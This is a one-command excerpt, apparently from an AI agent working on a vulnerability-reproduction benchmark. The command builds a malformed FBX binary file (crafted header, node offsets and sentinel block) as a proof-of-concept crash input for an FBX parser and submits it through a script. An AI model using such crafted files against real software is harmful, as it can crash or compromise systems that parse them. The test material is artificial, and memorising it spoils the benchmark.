Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
buf = bytearray(b'Kaydara FBX Binary  ')
buf += b'\x00\x1a\x00\x00\x00'
buf += (7500).to_bytes(4,'big')
# end_offset 0x2b, prop_count 0, prop_length 0, name len 1 'A'
buf += (0x2b).to_bytes(4,'big')
buf += (0).to_bytes(4,'big')
buf += (0).to_bytes(4,'big')
buf += bytes([1]) + b'A'
# 25-byte sentinel block all zeros
buf += b'\x00'*25
# pad to 0x2b bytes total so end_offset is within file
if len(buf) < 0x2b:
    buf += b'\x00'*(0x2b-len(buf))
Path('/workspace/candidate_poc.fbx').write_bytes(buf)
print('len', len(buf), 'hex', buf.hex())
PY
bash ./submit.sh /workspace/candidate_poc.fbx /workspace/candidate_trace.json || true
